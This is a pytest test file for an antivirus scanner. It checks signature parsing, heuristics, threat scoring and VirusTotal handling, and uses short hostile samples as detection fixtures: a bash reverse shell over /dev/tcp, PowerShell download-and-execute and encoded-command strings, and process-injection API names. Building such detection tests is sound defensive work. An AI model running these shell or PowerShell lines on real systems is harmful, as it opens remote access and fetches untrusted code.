import hashlib
import os
import random

import pytest

from alvsafe import paths
from alvsafe.config import Settings
from alvsafe.core import heuristic, signatures
from alvsafe.core.scanner import Scanner
from alvsafe.core.threat_score import calculate_threat_score, classify_score


def scan(tmp_path, nome, conteudo, settings=None, bus=None, **kw):
    f = tmp_path / nome
    f.write_bytes(conteudo)
    s = Scanner(settings or Settings(), bus=bus, auto_quarantine=False, **kw)
    s._in_temp = lambda p: False  # o tmp_path do pytest fica dentro de /tmp
    return s.scan_file(f)


def instalador_falso(tamanho=200_000):
    """Binário comprimido com strings comuns, como um instalador de verdade."""
    rnd = random.Random(1234)
    corpo = bytearray(rnd.getrandbits(8) for _ in range(tamanho))
    for texto in (b"curl", b"VirtualAlloc", b"base64", b"cmd.exe /c"):
        corpo[rnd.randrange(tamanho - 32):][:len(texto)] = texto
    return b"MZ\x90\x00" + bytes(corpo)


# ---------- assinaturas ----------

def test_so_sha256_e_aceito():
    s = signatures.parse("\n".join([
        "# comentário",
        "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f  # EICAR",
        "44d88612fea8a8f36de82e1278abb02f",          # MD5 do formato antigo
        "da39a3ee5e6b4b0d3255bfef95601890afd80709",  # SHA-1
        "isto não é hash",
    ]))
    assert len(s) == 1 and s.legacy == 2 and s.invalid == 1


def test_pacote_traz_o_eicar_em_sha256():
    s = signatures.load_signature_set()
    assert s.legacy == 0 and s.invalid == 0
    assert "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f" in s


def test_hash_do_usuario_e_somado(tmp_path):
    conteudo = b"#!/bin/sh\necho x\n"
    sha = hashlib.sha256(conteudo).hexdigest()
    paths.user_signatures_file().write_text(f"{sha}  # meu\n")
    result = scan(tmp_path, "a.sh", conteudo)
    assert result.is_threat and result.score >= 100 and "hash conhecido" in result.reasons


# ---------- falsos positivos ----------

def test_instalador_legitimo_nao_e_ameaca(tmp_path, bus):
    """O caso real: o instalador do Python foi para a quarentena por conter 'curl'."""
    result = scan(tmp_path, "setup.exe", instalador_falso(), bus=bus)
    assert not result.is_threat
    assert not any("heurística" in r or "fracos" in r for r in result.reasons)
    assert result.classification == "SAFE"


def test_binario_nao_passa_pela_heuristica():
    binario = b"MZ\x90\x00" + os.urandom(500) + b"Invoke-Expression" + b"\x00" * 100
    assert heuristic.looks_binary(binario)
    assert heuristic.analyze(binario).strong == []


def test_entropia_alta_sozinha_nao_condena(tmp_path):
    result = scan(tmp_path, "dados.exe", os.urandom(100_000))
    assert result.score == 20 and not result.is_threat


def test_indicios_fracos_tem_teto(tmp_path):
    script = b"#!/bin/sh\ncurl x | base64\nchmod +x y\nnc.exe z\ncmd.exe /c w\n"
    result = scan(tmp_path, "setup.sh", script)
    assert result.score <= 30 and not result.is_threat


# ---------- detecções que devem acontecer ----------

def test_eicar_detectado(tmp_path, eicar):
    result = scan(tmp_path, "eicar.sh", eicar)
    assert result.is_threat and result.classification == "MALWARE"


def test_pasta_temporaria_pontua(tmp_path):
    f = tmp_path / "a.sh"
    f.write_bytes(b"echo oi\n")
    result = Scanner(Settings(), auto_quarantine=False).scan_file(f)
    assert result.score == 10 and "pasta temporária" in result.reasons


def test_duas_palavras_fortes_ja_bastam(tmp_path):
    result = scan(tmp_path, "a.ps1", b"Invoke-Expression (DownloadString)",
                  settings=Settings(yara_detection=False))
    assert result.score == 60 and result.is_threat


def test_powershell_ofuscado(tmp_path):
    result = scan(tmp_path, "a.ps1", b"powershell -enc SQBFAFgA; Invoke-Expression $payload")
    assert result.is_threat
    assert any(r.startswith("heurística") for r in result.reasons)


def test_script_utf16_do_windows(tmp_path):
    script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('x')".encode("utf-16")
    result = scan(tmp_path, "a.ps1", script)
    assert result.is_threat


def test_shell_reverso(tmp_path):
    pytest.importorskip("yara")
    result = scan(tmp_path, "s.sh", b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    assert result.is_threat


def test_injecao_de_processo_pelas_tres_apis(tmp_path):
    pytest.importorskip("yara")
    corpo = b"MZ" + os.urandom(2000) + b"VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00"
    result = scan(tmp_path, "inj.exe", corpo)
    assert any("YARA" in r for r in result.reasons)


def test_entropia_amostrada_em_arquivo_grande():
    from alvsafe.core.scanner import shannon_entropy

    grande = os.urandom(6 * 1024 * 1024)
    assert shannon_entropy(grande) == pytest.approx(8.0, abs=0.01)
    assert shannon_entropy(b"a" * (6 * 1024 * 1024)) == 0


# ---------- pontuação ----------

@pytest.mark.parametrize("indicadores,esperado", [
    ({"signature_match": True}, 100),
    ({"yara_match": True}, 60),
    ({"heuristic_strong": True, "high_entropy": True}, 60),
    ({"heuristic_strong": True, "heuristic_strong_extra": 3}, 80),
    ({"heuristic_weak": 5}, 20),          # teto
    ({"high_entropy": True, "temp_execution": True}, 30),
    ({}, 0),
])
def test_pontuacao(indicadores, esperado):
    assert calculate_threat_score(indicadores) == esperado


def test_classificacao():
    assert classify_score(100) == "MALWARE"
    assert classify_score(60) == "DANGEROUS"
    assert classify_score(30) == "SUSPICIOUS"
    assert classify_score(29) == "SAFE"


# ---------- VirusTotal ----------

@pytest.fixture
def vt(monkeypatch):
    chamadas = []

    def fake(path):
        chamadas.append(str(path))
        return {"malicious": 5, "suspicious": 0, "sha256": "x"}

    monkeypatch.setattr("alvsafe.core.virustotal.check_virustotal", fake)
    return chamadas


def test_vt_desligado_por_padrao(tmp_path, vt):
    scan(tmp_path, "a.ps1", b"powershell -enc AAA")
    assert vt == []


def test_vt_consulta_o_que_e_suspeito(tmp_path, vt):
    settings = Settings(virustotal=True, yara_detection=False)
    result = scan(tmp_path, "a.ps1", b"powershell -enc AAA", settings=settings)
    assert len(vt) == 1
    assert result.score >= 100 and "VirtualTotal" not in str(result.reasons)
    assert any("VirusTotal: 5" in r for r in result.reasons)


def test_vt_nao_gasta_cota_com_arquivo_limpo(tmp_path, vt):
    scan(tmp_path, "limpo.sh", b"echo oi\n", settings=Settings(virustotal=True))
    assert vt == []


def test_vt_usa_cache_por_hash(tmp_path, vt):
    settings = Settings(virustotal=True, yara_detection=False)
    s = Scanner(settings, auto_quarantine=False)
    for nome in ("a.ps1", "b.ps1"):
        f = tmp_path / nome
        f.write_bytes(b"powershell -enc AAA")
        s.scan_file(f)
    assert len(vt) == 1  # mesmo conteúdo, uma consulta só


def test_vt_sem_resposta_nao_quebra(tmp_path, monkeypatch):
    monkeypatch.setattr("alvsafe.core.virustotal.check_virustotal", lambda p: None)
    result = scan(tmp_path, "a.ps1", b"powershell -enc AAA",
                  settings=Settings(virustotal=True, yara_detection=False))
    assert result.score == 40 and not result.is_threat
